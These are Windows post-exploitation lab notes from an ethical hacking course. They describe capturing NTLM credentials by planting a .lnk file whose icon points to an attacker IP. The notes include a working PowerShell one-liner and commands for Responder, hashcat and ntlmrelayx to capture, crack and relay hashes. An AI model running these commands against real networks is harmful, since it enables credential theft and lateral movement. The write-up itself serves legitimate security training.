# Windows Post-Exploitation — PEH Lab Notes

Notes from the Practical Ethical Hacking Active Directory lab.  
All actions performed in an **authorized lab environment**.

---

## Capturing NTLM via Malicious `.lnk` Files

**Goal:** Plant a `.lnk` file in a writable share so that when a user browses the folder, the custom icon forces their machine to authenticate to your attacker box over SMB, leaking NTLM credentials.

**Quick flow:**
1. From Meterpreter → `shell` → `net view \\TARGET-SERVER` → find writable share.
2. Map share (`net use Z:`) and test write with `echo test > Z:\file.txt`.
3. In PowerShell, create `.lnk` with `IconLocation` = `\\ATTACKER-IP\icon\foo.ico`.
4. Background the shell (`CTRL+Z`, `y`) to keep session alive.
5. Run Responder or impacket SMB server on Kali.
6. Wait for user to view share → collect hashes.

**One-liner PowerShell from Meterpreter:**
```powershell
$a='192.0.2.10';$d='\\\\TARGET-SERVER\\\\hackme\\\\readme.lnk';$s=New-Object -ComObject WScript.Shell;$l=$s.CreateShortcut($d);$l.TargetPath='cmd.exe';$l.Arguments='/c exit';$l.WorkingDirectory=$env:SystemRoot+'\\System32';$l.IconLocation='\\\\'+$a+'\\icon\\foo.ico';$l.Description='Readme';$l.Save()
```

---

## Collecting Hashes (Quick)

**Responder** — capture NetNTLMv2:
```bash
sudo responder -I eth0 -dwv
```
- Logs in `/usr/share/responder/logs/SMB-NTLMv2-*.txt`.
- Crack with:
```bash
hashcat -m 5600 /path/to/hash.txt /wordlist
```

**ntlmrelayx** — relay or capture:
```bash
echo "\\\\TARGET1" > targets.txt
sudo ntlmrelayx.py -tf targets.txt -smb2support -of hashes.txt
```

---

**Disclaimer:** For PEH lab use only. Do not attempt on networks you do not own or have explicit permission to test.
